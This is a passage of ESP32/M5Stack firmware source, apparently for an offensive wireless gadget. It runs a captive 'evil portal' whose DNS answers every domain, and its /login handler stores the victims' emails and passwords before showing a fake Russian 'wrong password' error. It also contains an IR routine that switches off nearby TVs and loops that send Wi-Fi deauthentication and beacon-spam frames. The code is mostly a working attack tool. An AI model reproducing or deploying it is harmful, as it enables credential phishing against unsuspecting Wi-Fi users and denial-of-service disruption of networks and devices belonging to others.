    if (server.hasArg("region")) {
      int region = server.arg("region").toInt();
      killAllTv(region);
      server.send(200, "text/plain", "ALL FIRED!");
    } else server.send(400, "text/plain", "NO REGION");
  });

  server.on("/portal/on", HTTP_GET, [](){
    isEvilPortalActive = true;
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    drawUI();
    server.send(200, "text/plain", "PORTAL ON");
  });

  server.on("/portal/off", HTTP_GET, [](){
    isEvilPortalActive = false;
    dnsServer.stop();
    drawUI();
    server.send(200, "text/plain", "PORTAL OFF");
  });

  server.on("/login", HTTP_POST, [](){
    String email = server.arg("email");
    String pass = server.arg("password");
    savePassword(email, pass);
    server.send(200, "text/html", "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h1>ОШИБКА</h1><p>Неверный пароль. Попробуйте еще раз.</p></body></html>");
  });

  server.onNotFound([](){
    if (isEvilPortalActive) {
      server.send_P(200, "text/html", portal_html);
    } else {
      server.send(404, "text/plain", "Not Found");
    }
  });

  server.begin();
}

// ================= SETUP =================
void setup() {
  auto cfg = M5.config();
  M5.begin(cfg);
  Serial.begin(115200);
  
  if(!SPIFFS.begin(true)) Serial.println("SPIFFS Error");
  loadLogs();

  ledcAttach(IR_PIN, 38000, 8);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("M5_Bruce");

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  setupServer();
  
  if (isEvilPortalActive) {
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }
  
  drawUI();
}

// ================= LOOP =================
void loop() {
  server.handleClient();
  if (isEvilPortalActive) dnsServer.processNextRequest();
  M5.update();

  if (isTvKilling) return; 

  if (M5.BtnA.wasPressed()) {
    currentTheme++;
    if (currentTheme >= 12) currentTheme = 0;
    drawUI();
    delay(150);
  }

  if (M5.BtnB.wasPressed()) {
    isSpamming = !isSpamming;
    drawUI();
    delay(150); 
  }

  if (isSpamming && (millis() - lastBeaconTime > 5)) {
    lastBeaconTime = millis();
    for(int i = 0; i < 30; i++) sendBeaconSpam();
    
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 1000) {
      lastDisplayUpdate = millis();
      drawUI();
    }
  }

  if (isDeauthing && (millis() - lastDeauthTime > 5)) {
    lastDeauthTime = millis();
    for(int i = 0; i < 20; i++) sendDeauth();
    
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 1000) {
      lastDisplayUpdate = millis();
      drawUI();
    }
  }
}
